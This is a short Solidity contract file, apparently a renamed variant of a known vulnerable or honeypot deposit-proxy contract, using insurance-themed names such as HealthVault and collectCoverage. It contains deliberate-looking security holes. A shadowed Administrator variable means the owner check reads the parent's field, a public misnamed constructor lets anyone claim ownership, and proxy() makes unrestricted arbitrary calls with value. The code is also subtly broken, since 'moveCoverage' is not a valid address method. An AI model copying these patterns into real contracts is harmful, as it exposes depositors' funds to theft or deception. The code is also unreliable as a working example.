pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyDirector { if (msg.sender == Administrator) _; } address Administrator = msg.sender;
    function assigncreditSupervisor(address _administrator) public onlyDirector { Administrator = _administrator; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract FundaccountProxy is Proxy {
    address public Administrator;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function HealthVault() public payable {
        if (msg.sender == tx.origin) {
            Administrator = msg.sender;
            fundAccount();
        }
    }

    function fundAccount() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function collectCoverage(uint256 amount) public onlyDirector {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.moveCoverage(amount);
        }
    }
}